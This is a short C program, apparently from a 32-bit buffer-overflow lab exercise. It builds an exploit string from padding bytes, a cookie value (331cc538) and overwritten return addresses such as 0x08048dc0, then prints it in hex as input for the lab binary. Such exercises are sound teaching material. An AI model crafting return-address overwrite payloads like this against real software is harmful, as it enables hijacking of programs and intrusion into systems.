#include <stdio.h>
#include <string.h>

//331cc538
char out[] = {0x48, 0x48, 0x48, 0x48, 
              0x48, 0x48, 0x48, 0x48,
              0x48, 0x48, 0x48, 0x48, 
              0x08, 0xb8, 0xff, 0xff, 
              //08048dc0
              0xc0, 0x8d, 0x04, 0x08,
              0x48, 0x48, 0x48, 0x48, 
              0x38, 0xc5, 0x1c, 0x33,
              0xc7, 0x9a, 0x04, 0x08,
              0x14, 0xb8, 0xff, 0xff, 0x00};

int out2[] = {0x48, 0x48, 0x48, 0x48, 
              0x48, 0x48, 0x48, 0x48,
              0x48, 0x48, 0x48, 0x48, 
              0x08, 0xb8, 0xff, 0xff, 
              //08048dc0
              0xc0, 0x8d, 0x04, 0x08, 
              0x48, 0x48, 0x48, 0x48,
              0x38, 0xc5, 0x1c, 0x33,
              0xc7, 0x9a, 0x04, 0x08,
              0x14, 0xb8, 0xff, 0xff};

int main() {
    for (int i = 0; i < strlen(out) - 1; i++) {
        if (out2[i] < 16) {
            printf("0");
        }
        printf("%x ", out2[i]);
    }
    if (out2[strlen(out) - 1] < 16) {
            printf("0");
    }
    printf("%x", out2[strlen(out) - 1]);
    return 0;
}